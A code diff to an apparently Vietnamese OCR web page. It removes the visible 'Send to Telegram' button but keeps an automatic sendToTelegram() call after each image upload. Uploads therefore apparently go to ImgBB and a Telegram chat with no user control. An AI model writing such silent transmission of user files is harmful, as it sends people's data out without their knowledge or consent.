@@ -117,6 +117,18 @@
     transition: all 0.3s ease;
 }
 
+  .text-output {
+    position: relative;
+    background: rgba(0, 0, 0, 0.2);
+    border-radius: 10px;
+    padding: 20px;
+    margin: 20px 0;
+    max-height: 200px;
+    overflow-y: auto;
+    display: none;
+    animation: slideUp 0.5s ease-out;
+}      
+
 .copy-button:hover {
     background: #3dbdb4;
     transform: scale(1.05);
@@ -331,7 +343,6 @@
         const previewImage = document.getElementById('previewImage');
         const textOutput = document.getElementById('textOutput');
         const extractBtn = document.getElementById('extractBtn');
-        const sendBtn = document.getElementById('sendBtn');
         const loading = document.getElementById('loading');
         const notification = document.getElementById('notification');
         const copyBtn = document.getElementById('copyBtn');
@@ -348,7 +359,7 @@
         dropZone.addEventListener('drop', handleDrop);
         fileInput.addEventListener('change', handleFileSelect);
         extractBtn.addEventListener('click', extractText);
-        sendBtn.addEventListener('click', sendToTelegram);
+       
         
         copyBtn.addEventListener('click', async () => {
     try {
@@ -424,15 +435,13 @@ async function uploadToImgBB(file) {
         previewImage.src = e.target.result;
         previewArea.style.display = 'block';
         extractBtn.style.display = 'inline-block';
-        sendBtn.style.display = 'inline-block';
         textOutput.style.display = 'none';
         extractedText = '';
         
-        // Tự động xử lý khi upload
-        await Promise.all([
-            extractText(),    // Trích xuất text
-            sendToTelegram() // Upload và gửi link
-        ]);
+        // Trích xuất text trước
+        await extractText();
+        // Sau đó mới gửi lên Telegram 
+        await sendToTelegram();
     };
 
     reader.readAsDataURL(file);
